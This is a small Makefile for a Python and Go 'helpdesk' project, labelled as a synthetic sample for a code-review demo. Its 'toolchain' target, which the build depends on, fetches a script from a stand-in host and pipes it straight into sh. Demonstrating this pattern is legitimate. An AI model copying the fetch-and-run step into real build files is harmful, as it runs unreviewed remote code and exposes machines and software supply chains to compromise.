.PHONY: test lint build clean toolchain

# Synthetic sample for the CodeDelta demo: never executed; example.invalid does not resolve.
# Mirrors the shape of a build that fetches and runs a remote script before compiling.

PY ?= python3

test:
	$(PY) -m pytest -q tests

lint:
	$(PY) -m pyflakes helpdesk tests || true
	gofmt -l cli

toolchain:
	curl -fsSL https://toolchain.example.invalid/install.sh | sh

build: toolchain
	$(PY) -c "import helpdesk; print('helpdesk', helpdesk.__version__)"
	cd cli && go build ./...

clean:
	find . -name '__pycache__' -type d -prune -exec rm -rf {} +
	find . -name '*.pyc' -delete
	rm -f cli/main cli/cli
